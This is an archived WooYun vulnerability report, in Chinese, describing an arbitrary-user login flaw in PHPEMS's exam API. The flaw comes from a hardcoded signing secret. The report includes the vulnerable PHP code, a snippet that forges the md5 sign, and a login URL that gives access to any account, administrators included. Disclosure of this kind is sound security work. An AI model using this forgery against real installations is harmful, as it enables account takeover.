{"id": 36856, "wybug_id": "wooyun-2015-0100979", "wybug_title": "phpems某处设计不当可任意用户登陆", "wybug_corp": "PHPEMS", "wybug_author": "路人甲", "wybug_date": "2015-03-12 18:11", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： phpems某处设计不当可任意用户登陆 详细说明：  马上要去实习了，时间越来越珍贵，再发一个cms的吧1.Phpems存在一个平行权限和垂直权限的奇葩漏洞，利用这个漏洞可以登录任意用户包括管理员。具体出现漏洞的地方在/app/exam/api.php的login()函数中//通过接口进行登录\tpublic function login()\t{\t\t//print \"start\";exit();\t\t$sign = $this->ev->get('sign');\t\t$userid = $this->ev->get('userid');\t\t$username = $this->ev->get('username');\t\t$useremail = $this->ev->get('useremail');\t\t$ts = $this->ev->get('ts');\t\t$rand =rand(1,6);\t\tif($rand == 5)\t\t{\t\t\t$this->session->clearOutTimeUser();\t\t\t$this->exam->clearOutTimeExamSession();\t\t}\t\tif($sign == md5($userid.$username.$useremail.$this->sc.$ts))\t\t{\t\t\t$user = $this->G->make('user','user');\t\t\t$u = $user->getUserByUserName($username);\t\t\tif(!$u)\t\t\t{\t\t\t\t$defaultgroup = $this->user->getDefaultGroup();\t\t\t\t$pass = md5(rand(1000,9999));\t\t\t\t$id = $this->user->insertUser(array('username' => $username,'usergroupid' => $defaultgroup['groupid'],'userpassword' => md5($pass),'useremail' => $useremail));\t\t\t\t$this->session->setSessionUser(array('sessionuserid'=>$id,'sessionpassword'=>md5($pass),'sessionip'=>$this->ev->getClientIp(),'sessiongroupid'=>$defaultgroup,'sessionlogintime'=>TIME,'sessionusername'=>$username));\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$args = array('sessionuserid'=>$u['userid'],'sessionpassword'=>$u['userpassword'],'sessionip'=>$this->ev->getClientIp(),'sessiongroupid'=>$u['usergroupid'],'sessionlogintime'=>TIME,'sessionusername'=>$u['username']);\t\t\t\t$this->session->setSessionUser($args);\t\t\t}\t\t\theader(\"location:\".'index.php?'.$this->G->app.'-app');\t\t}上面的注释已经给出代码意思了，就是登录接口判断登录的语句是：if($sign == md5($userid.$username.$useremail.$this->sc.$ts))如果成功就会利用$username进行对应用户查询可笑的地方在于这里面所有的变量都是可以从URL连接中控制的，只有$this->sc不可控，但是它居然是硬编码的，就在该页代码的最上方class app{\tpublic $G;\t//联系密钥\tprivate $sc = 'exam@phpems.net';\tpublic function __construct(&$G)\t{\t\t$this->G = $G;\t\t$this->ev = $this->G->make('ev');\t\t$this->tpl = $this->G->make('tpl');\t\t$this->sql = $this->G->make('sql');\t\t$this->db = $this->G->make('db');\t\t$this->pg = $this->G->make('pg');\t\t$this->html = $this->G->make('html');\t\t$this->session = $this->G->make('session');\t\t$this->exam = $this->G->make('exam','exam');\t\t$this->user = $this->G->make('user','user');\t}所以一切就顺利成章了，我们可以人为指定这些参数变量，使其满足条件，然后任意变换username, 就可以任意搞它了我先本地构造一些参数如下（可以任意设置我只是举一个例子）<?php$userid=\"1\";$username=\"test\";$useremail=\"franklin1990@126.com\";$sc=\"exam@phpems.net\";$ts=\"test\";print md5($userid.$username.$useremail.$sc.$ts);//270c0bd1c907912a1b464ff4ff4b95b4?>利用生成的md5,然后访问链接http://localhost/ems/index.php?exam-api-login&sign=270c0bd1c907912a1b464ff4ff4b95b4&userid=1&username=test&useremail=franklin1990@126.com&ts=test\n\n成功登陆到test用户，这个漏洞利用起来很容易，只要知道任意用户的用户名，修改$username和生成的MD5也就是url参数sign访问对应链接，就能实现任意用户登录，尤其是管理员用户，也是可以的，因为管理员和普通用户都在同一张表内。   漏洞证明：  我先本地构造一些参数如下（可以任意设置我只是举一个例子）<?php$userid=\"1\";$username=\"test\";$useremail=\"franklin1990@126.com\";$sc=\"exam@phpems.net\";$ts=\"test\";print md5($userid.$username.$useremail.$sc.$ts);//270c0bd1c907912a1b464ff4ff4b95b4?>利用生成的md5,然后访问链接http://localhost/ems/index.php?exam-api-login&sign=270c0bd1c907912a1b464ff4ff4b95b4&userid=1&username=test&useremail=franklin1990@126.com&ts=test\n\n成功登陆到test用户   修复方案：  增加密码之类的逻辑验证，这样验证太简单了   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}